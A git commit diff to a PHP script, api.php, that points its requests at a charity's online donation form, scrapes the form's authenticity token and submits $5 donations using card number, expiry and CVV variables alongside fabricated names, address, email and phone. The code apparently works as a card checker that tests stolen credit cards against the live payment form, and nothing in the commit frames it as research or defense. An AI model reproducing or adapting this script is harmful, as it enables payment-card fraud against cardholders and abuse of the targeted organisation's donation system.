dcc34db6847a4594bcd2e4af10493b421cefa35c
nic0latesla <elec7r00n@gmail.com>
2018-12-13 17:09:57 -0300

    updating

--- api.php
+++ api.php
@@ -73,14 +73,14 @@ $m = $mess;
 return $m;
 }
 
-$r =  doPost('https://www.website.com');
+$r =  doPost('https://www.cair.com/donate');
 
 $token =  getToken($r,'authenticity_token" type="hidden" value="','"');
 
 $mes = formatMes($mes);
 
 
-$r =  doPost("https://www.website.com","authenticity_token=$token&page_id=14774&return_to=https%3A%2F%2Fwww.cair.com%2Fauthorize&email_address=&donation%5Bamount%5D=5.00&donation%5Bcustom_values%5D%5Bzakat_ind%5D=0&donation%5Bcard_number%5D=$cc&donation%5Bcard_expires_on%281i%29%5D=$ano&donation%5Bcard_expires_on%282i%29%5D=$mes&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D=$cvv&donation%5Bfirst_name%5D=Peter&donation%5Blast_name%5D=Paterson&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=$country&donation%5Bbilling_address_attributes%5D%5Bstate%5D=$estado&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Av. Patrerinon&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=&donation%5Bbilling_address_attributes%5D%5Bcity%5D=$city&donation%5Bbilling_address_attributes%5D%5Bzip%5D=$zipcode&donation%5Bemail%5D=mitrunfaterin%40gmail.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=154548454848&donation%5Bemail_opt_in%5D=0&donation%5Bis_private%5D=0");
+$r =  doPost("https://www.cair.com/forms/donations","authenticity_token=$token&page_id=14774&return_to=https%3A%2F%2Fwww.cair.com%2Fauthorize&email_address=&donation%5Bamount%5D=5.00&donation%5Bcustom_values%5D%5Bzakat_ind%5D=0&donation%5Bcard_number%5D=$cc&donation%5Bcard_expires_on%281i%29%5D=$ano&donation%5Bcard_expires_on%282i%29%5D=$mes&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D=$cvv&donation%5Bfirst_name%5D=Peter&donation%5Blast_name%5D=Paterson&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=$country&donation%5Bbilling_address_attributes%5D%5Bstate%5D=$estado&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Av. Patrerinon&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=&donation%5Bbilling_address_attributes%5D%5Bcity%5D=$city&donation%5Bbilling_address_attributes%5D%5Bzip%5D=$zipcode&donation%5Bemail%5D=mitrunfaterin%40gmail.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=154548454848&donation%5Bemail_opt_in%5D=0&donation%5Bis_private%5D=0");
 
 
 echo $r;
